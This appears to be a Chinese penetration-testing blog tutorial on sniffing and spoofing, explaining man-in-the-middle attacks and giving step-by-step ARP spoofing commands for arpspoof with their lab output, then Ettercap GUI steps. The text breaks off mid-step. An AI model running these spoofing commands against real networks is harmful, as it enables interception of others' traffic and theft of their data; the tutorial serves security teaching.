<!-- build time:Mon Sep 27 2021 15:21:17 GMT+0800 (GMT+08:00) --><!DOCTYPE html><html class="theme-next gemini use-motion" lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script><link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet"><script></script><meta name="theme-color" content="#222"><style>.pace .pace-progress{background:#1E92FB;height:3px}.pace .pace-progress-inner{box-shadow:0 0 10px #1E92FB,0 0 5px #1E92FB}.pace .pace-activity{border-top-color:#1E92FB;border-left-color:#1E92FB}</style><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="google-site-verification" content="HGM141IpbHrSmnAmR6W_zE4bo9Z3f-yXLeHYT3bg1fk"><meta name="baidu-site-verification" content="code-5Ai1DA8e6T"><link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"><link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css"><link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4"><link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222"><meta name="keywords" content="渗透测试,嗅探欺骗,"><link rel="alternate" href="/atom.xml" title="凡间的精灵" type="application/atom+xml"><meta name="description" content="嗅探欺骗嗅探欺骗是指通过对目标主机实施欺骗，来嗅探目标主机网络上经过的所有数据包，最典型的就是中间人攻击。如果目标主机不存在漏洞，用户则无法进行漏洞利用以实现渗透。此时，用户可以通过中间人攻击的方式对目标主机进行欺骗，以嗅探目标主机从网络中传输的数据。一、中间人攻击中间人攻击（Man-in-the-Middle Attack），简称MITM攻击，是一种“间接”的入侵攻击。这种攻击模式是通过各种技术"><meta name="keywords" content="渗透测试,嗅探欺骗"><meta property="og:type" content="article"><meta property="og:title" content="嗅探欺骗"><meta property="og:url" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;index.html"><meta property="og:site_name" content="凡间的精灵"><meta property="og:description" content="嗅探欺骗嗅探欺骗是指通过对目标主机实施欺骗，来嗅探目标主机网络上经过的所有数据包，最典型的就是中间人攻击。如果目标主机不存在漏洞，用户则无法进行漏洞利用以实现渗透。此时，用户可以通过中间人攻击的方式对目标主机进行欺骗，以嗅探目标主机从网络中传输的数据。一、中间人攻击中间人攻击（Man-in-the-Middle Attack），简称MITM攻击，是一种“间接”的入侵攻击。这种攻击模式是通过各种技术"><meta property="og:locale" content="zh-Hans"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%871.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%872.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%873.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%874.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%875.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%876.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%877.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%878.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%879.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%8710.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%8711.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%8712.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%8713.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%8714.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%8715.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%8716.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%8717.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%8719.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%8720.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%8721.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%8722.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%8723.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%8724.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%8725.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%8726.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%8727.png"><meta property="og:updated_time" content="2021-02-20T01:50:32.956Z"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;04&#x2F;kali-xiu-tan-qi-pian&#x2F;%E5%9B%BE%E7%89%871.png"><script type="text/javascript" id="hexo.configurations">var NexT=window.NexT||{},CONFIG={root:"/",scheme:"Gemini",version:"5.1.4",sidebar:{position:"left",display:"always",offset:12,b2t:!0,scrollpercent:!0,onmobile:!0},fancybox:!0,tabs:!0,motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},duoshuo:{userId:"0",author:"博主"},algolia:{applicationID:"",apiKey:"",indexName:"",hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}}}</script><link rel="canonical" href="http://chenzhonzhou.github.io/2021/01/04/kali-xiu-tan-qi-pian/"><title>嗅探欺骗 | 凡间的精灵</title><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head><body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans"><div class="container sidebar-position-left page-post-detail"><div class="headband"></div><header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-wrapper"><div class="site-meta"><div class="custom-logo-site-title"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">凡间的精灵</span> <span class="logo-line-after"><i></i></span></a></div><p class="site-subtitle">凡尘落素一精灵</p></div><div class="site-nav-toggle"><button><span class="btn-bar"></span> <span class="btn-bar"></span> <span class="btn-bar"></span></button></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i><br>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i><br>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i><br>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i><br>标签</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i><br>站点地图</a></li><li class="menu-item menu-item-search"><a href="javascript:;" class="popup-trigger"><i class="menu-item-icon fa fa-search fa-fw"></i><br>搜索</a></li></ul><div class="site-search"><div class="popup search-popup local-search-popup"><div class="local-search-header clearfix"><span class="search-icon"><i class="fa fa-search"></i> </span><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span><div class="local-search-input-wrapper"><input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input"></div></div><div id="local-search-result"></div></div></div></nav></div></header><main id="main" class="main"><div class="main-inner"><div class="content-wrap"><div id="content" class="content"><div id="posts" class="posts-expand"><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://chenzhonzhou.github.io/2021/01/04/kali-xiu-tan-qi-pian/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Zhongzhou Chen"><meta itemprop="description" content=""><meta itemprop="image" content="/images/chen.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="凡间的精灵"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">嗅探欺骗</h1><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-01-04T14:59:18+08:00">2021-01-04 </time></span><span class="post-category"><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-folder-o"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span></span><div class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i> </span><span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">11.1k </span><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span title="阅读时长">50</span></div></div></header><div class="post-body" itemprop="articleBody"><h1 id="嗅探欺骗"><a href="#嗅探欺骗" class="headerlink" title="嗅探欺骗"></a>嗅探欺骗</h1><p>嗅探欺骗是指通过对目标主机实施欺骗，来嗅探目标主机网络上经过的所有数据包，最典型的就是中间人攻击。如果目标主机不存在漏洞，用户则无法进行漏洞利用以实现渗透。此时，用户可以通过中间人攻击的方式对目标主机进行欺骗，以嗅探目标主机从网络中传输的数据。</p><h2 id="一、中间人攻击"><a href="#一、中间人攻击" class="headerlink" title="一、中间人攻击"></a>一、中间人攻击</h2><p>中间人攻击（Man-in-the-Middle Attack），简称MITM攻击，是一种“间接”的入侵攻击。这种攻击模式是通过各种技术手段将入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为“中间人”。</p><h3 id="1-1-工作原理"><a href="#1-1-工作原理" class="headerlink" title="1.1 工作原理"></a>1.1 工作原理</h3><p>中间人攻击很早就成为了黑客常用的攻击手段，并且一直流传至今。其中，最典型的中间人攻击手段有ARP欺骗和DNS欺骗等技术。简单地说，中间人攻击就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信的双方却毫不知情。下面介绍中间人攻击的工作原理。</p><p>这里将以ARP欺骗技术为例，介绍中间人攻击的工作原理。一般情况下，ARP欺骗并不是使网络无法正常通信，而是通过冒充网关或其他主机使得到达网关或主机的数据流通过攻击主机进行转发。通过转发流量可以对流量进行控制和查看，从而获取流量或得到机密信息。ARP欺骗主机的流程，如下图所示。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%871.png" alt="图片1"></p><p>当主机A和主机B之间通信时，如果主机A在自己的ARP缓存表中没有找到主机B的MAC地址，主机A将会向整个局域网中的所有计算机发送ARP广播，广播后整个局域网中的计算机都会收到该数据。这时候，主机C响应主机A，说我是主机B，我的MAC地址是XX-XX-XX-XX-XX-XX，主机A收到地址后就会重新更新自己的缓存表。当主机A再次与主机B通信时，该数据将被发送给攻击主机（主机C）上，主机C收到后再转发到主机B。</p><h3 id="1-2-实施中间人攻击"><a href="#1-2-实施中间人攻击" class="headerlink" title="1.2 实施中间人攻击"></a>1.2 实施中间人攻击</h3><p>当用户对中间人攻击原理了解清楚后，就可以实施中间人攻击了。下面介绍使用arpspoof和Ettercap实施中间人攻击的方法。</p><h4 id="1-2-1-使用arpspoof工具"><a href="#1-2-1-使用arpspoof工具" class="headerlink" title="1.2.1 使用arpspoof工具"></a>1.2.1 使用arpspoof工具</h4><p>arpspoof是一款专业的ARP欺骗工具，能够直接欺骗网关，使得通过网关访问网络的计算机全被欺骗攻击。通过ARP欺骗，可以达到中间人嗅探和捕获数据包的目的，并替换传输中的数据。下面将介绍使用arpspoof工具实施ARP攻击的方法。</p><p>arpspoof工具的语法格式如下：</p><blockquote><p>arpspoof [选项] host</p></blockquote><p>该工具支持的选项及含义如下：</p><blockquote><p>-i interface：指定使用的接口。<br>-t target：指定ARP欺骗的目标。如果没有指定，将对局域网中所有主机进行欺骗。<br>-r：实施双向欺骗。该选项需要与-t选项一起使用才有效。</p></blockquote><p>使用arpspoof工具实施ARP攻击。具体操作步骤如下：</p><ol><li><p>开启路由转发。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@daxueba:~<span class="comment"># echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span></span><br><span class="line">root@daxueba:~<span class="comment"># cat /proc/sys/net/ipv4/ip_forward</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>看到以上输出信息，表示已成功开启了路由转发。如果用户不开启路由转发，则目标主机就无法访问网络。</p></li><li><p>查看攻击主机的IP地址和ARP缓存表。首先查看IP地址如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ifconfig</span></span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.10.75  netmask 255.255.255.0  broadcast 192.168.10.255</span><br><span class="line">        inet6 fe80::5054:ff:febf:d0ac  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 52:54:00:bf:d0:ac  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 607049  bytes 814703921 (776.9 MiB)</span><br><span class="line">        RX errors 0  dropped 209658  overruns 0  frame 0</span><br><span class="line">        TX packets 414772  bytes 29666529 (28.2 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 38  bytes 2118 (2.0 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 38  bytes 2118 (2.0 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><p>从输出的信息中，可以看到攻击主机的IP地址为192.168.10.75，MAC地址为52:54:00:bf:d0:ac。接下来，查看其ARP缓存表如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># arp</span></span><br><span class="line">Address           HWtype  HWaddress           Flags Mask    Iface</span><br><span class="line">gateway           ether   80:05:88:e6:74:7c   C             eth0</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，攻击主机中只有一条网关ARP记录。而且，该网关的MAC地址为bc:30:5b:f6:39:00。</p></li><li><p>查看目标主机的IP地址和ARP缓存表。首先查看目标主机的IP地址如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ifconfig </span></span><br><span class="line">ens3: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.10.74  netmask 255.255.255.0  broadcast 192.168.10.255</span><br><span class="line">        inet6 fe80::1e96:a094:643:61af  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 52:54:00:26:f1:a9  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 897325  bytes 972579035 (927.5 MiB)</span><br><span class="line">        RX errors 0  dropped 86  overruns 0  frame 0</span><br><span class="line">        TX packets 361687  bytes 353058915 (336.7 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1  (Local Loopback)</span><br><span class="line">        RX packets 142  bytes 66503 (64.9 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 142  bytes 66503 (64.9 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，目标主机的IP地址为192.168.10.74，MAC地址为52:54:00:26:f1:a9。接下来查看ARP缓存表如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># arp</span></span><br><span class="line">Address         HWtype  HWaddress           Flags Mask        Iface</span><br><span class="line">gateway         ether   80:05:88:e6:74:7c   C                 ens3</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，也是只有一条绑定网关的ARP条目。通过查看地址信息，可以确定攻击主机与目标主机没有进行过任何通信。此时，只要这两台主机进行通信，将互相请求对方的IP和MAC地址。这时候就可以对其实施ARP攻击。</p></li><li><p>对目标主机实施ARP攻击。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># arpspoof -i eth0 -t 192.168.10.74 192.168.10.1</span></span><br><span class="line">52:54:0:bf:d0:ac 52:54:0:26:f1:a9 0806 42: arp reply 192.168.10.1 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 52:54:0:26:f1:a9 0806 42: arp reply 192.168.10.1 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 52:54:0:26:f1:a9 0806 42: arp reply 192.168.10.1 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 52:54:0:26:f1:a9 0806 42: arp reply 192.168.10.1 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 52:54:0:26:f1:a9 0806 42: arp reply 192.168.10.1 is-at 80:5:88:e6:74:7c</span><br><span class="line">52:54:0:bf:d0:ac 52:54:0:26:f1:a9 0806 42: arp reply 192.168.10.1 is-at 80:5:88:e6:74:7c</span><br><span class="line">52:54:0:bf:d0:ac 52:54:0:26:f1:a9 0806 42: arp reply 192.168.10.1 is-at 80:5:88:e6:74:7c</span><br><span class="line">52:54:0:bf:d0:ac 52:54:0:26:f1:a9 0806 42: arp reply 192.168.10.1 is-at 80:5:88:e6:74:7c</span><br><span class="line">52:54:0:bf:d0:ac 52:54:0:26:f1:a9 0806 42: arp reply 192.168.10.1 is-at 80:5:88:e6:74:7c</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，攻击主机在向目标主机发送ARP应答包，告诉目标主机网关的MAC地址为52:54:0:bf:d0:ac（攻击主机的MAC地址）。但是，实际上网关的MAC地址为80:5:88:e6:74:7c。由此可以说明，已开始对目标主机实施ARP欺骗。</p></li><li><p>对网关实施ARP攻击。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># arpspoof -i eth0 -t 192.168.10.1 192.168.10.74</span></span><br><span class="line">52:54:0:bf:d0:ac 80:5:88:e6:74:7c 0806 42: arp reply 192.168.10.74 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 80:5:88:e6:74:7c 0806 42: arp reply 192.168.10.74 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 80:5:88:e6:74:7c 0806 42: arp reply 192.168.10.74 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 80:5:88:e6:74:7c 0806 42: arp reply 192.168.10.74 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 80:5:88:e6:74:7c 0806 42: arp reply 192.168.10.74 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 80:5:88:e6:74:7c 0806 42: arp reply 192.168.10.74 is-at 52:54:0:bf:d0:ac</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，攻击主机在向网关发送ARP应答包，告诉网关目标主机的MAC地址为52:54:0:bf:d0:ac（攻击主机的MAC地址）。但是，实际上目标主机的MAC地址为52:54:00:26:f1:a9。由此可以说明，已开始对网关实施ARP欺骗。</p><p><strong>用户也可以通过一条命令同时对目标主机和网关实施ARP攻击。</strong>执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># arpspoof -i eth0 -t 192.168.10.74 -r 192.168.10.1</span></span><br><span class="line">52:54:0:bf:d0:ac 52:54:0:26:f1:a9 0806 42: arp reply 192.168.10.1 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 80:5:88:e6:74:7c 0806 42: arp reply 192.168.10.74 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 52:54:0:26:f1:a9 0806 42: arp reply 192.168.10.1 is-at 52:54:0:bf:d0:ac</span><br><span class="line">52:54:0:bf:d0:ac 80:5:88:e6:74:7c 0806 42: arp reply 192.168.10.74 is-at 52:54:0:bf:d0:ac</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，攻击主机分别向目标主机和网关发送了ARP响应包，告诉网关和目标主机彼此的MAC地址为52:54:0:bf:d0:ac。</p></li><li><p>查看目标主机的ARP缓存表。如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># arp</span></span><br><span class="line">Address                  HWtype  HWaddress           Flags Mask            Iface</span><br><span class="line">gateway                  ether   52:54:00:bf:d0:ac   C                     ens3</span><br><span class="line">192.168.10.75            ether   52:54:00:bf:d0:ac   C                     ens3</span><br></pre></td></tr></table></figure><p>从输出的信息中，可以看到该主机中的两条ARP记录（网关和攻击主机的ARP条目）。从显示的ARP条目中，可以看到网关与攻击主机的MAC地址相同。由此可以说明，目标主机成功地被ARP欺骗了。</p></li></ol><h4 id="1-2-2-使用Ettercap工具"><a href="#1-2-2-使用Ettercap工具" class="headerlink" title="1.2.2 使用Ettercap工具"></a>1.2.2 使用Ettercap工具</h4><p>Ettercap是一款基于ARP地址欺骗的网络嗅探工具，主要适用于交换局域网络。下面将介绍使用Ettercap工具实施中间人攻击的方法。</p><p>使用Ettercap工具实施中间人攻击。具体操作步骤如下：</p><ol><li><p>启动Ettercap工具。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ettercap -G</span></span><br></pre></td></tr></table></figure><p>执行以上命令后，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%872.png" alt="图片2"></p></li><li><p>在该对话框中选择网卡。这里选择eth0，然后单击“确定”按钮，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%873.png" alt="图片3"></p></li><li><p>启动接口后，默认就开始扫描所有的主机了。在菜单栏中选择Hosts List命令或按Ctrl+H快捷键，将显示如图下所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%874.png" alt="图片4"></p></li><li><p>该界面显示了扫描到的6台主机的IP地址和MAC地址。在该界面中，选择其中一台主机作为目标系统。这里选择192.168.100.115主机并单击Add to Target 1按钮，选择192.168.100.1并单击Add to Target 2按钮，然后就可以开始嗅探数据包了。在菜单栏中依次选择Start|Start sniffing命令，如下图所示。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%875.png" alt="图片5"></p></li><li><p>启动嗅探后，通过使用ARP注入攻击的方法获取目标系统的重要信息。启动ARP注入攻击，在菜单栏中依次选择Mitm|ARP poisoning…命令，如下图所示。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%876.png" alt="图片6"></p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%877.png" alt="图片7"></p></li><li><p>在该对话框中选择攻击的选项，这里选择Sniff remote 